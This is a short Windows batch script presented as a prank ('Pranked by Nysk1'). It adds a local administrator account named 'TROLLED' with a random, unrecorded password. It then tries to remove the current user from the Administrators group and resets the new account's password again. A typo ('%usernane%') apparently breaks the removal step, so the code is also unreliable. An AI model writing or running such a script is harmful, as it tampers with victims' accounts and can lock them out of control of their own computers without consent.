@echo off
net user TROLLED %random% /add
net localgroup Administrators TROLLED /add
net localgroup Administrators /delete %usernane%
net user TROLLED %random%
echo Pranked by Nysk1
pause